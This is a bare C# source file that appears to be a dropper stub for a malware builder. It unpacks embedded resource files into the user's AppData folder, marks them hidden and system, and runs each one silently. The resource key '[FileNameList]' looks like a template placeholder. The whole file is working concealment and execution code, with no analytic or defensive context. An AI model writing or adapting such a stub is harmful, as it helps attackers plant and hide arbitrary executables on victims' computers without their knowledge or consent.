using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;

internal class Program
{
	private static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("file", Assembly.GetExecutingAssembly());
		string[] array = resourceManager.GetString("[FileNameList]")!.Split(new char[1] { '|' });
		string text = null;
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), text2);
			if (File.Exists(text))
			{
				File.SetAttributes(text, FileAttributes.Normal);
			}
			using (FileStream fileStream = File.Create(text))
			{
				byte[] array3 = (byte[])resourceManager.GetObject(text2);
				fileStream.Write(array3, 0, array3.Length);
			}
			File.SetAttributes(text, FileAttributes.Hidden | FileAttributes.System);
			Process.Start(text);
		}
	}
}
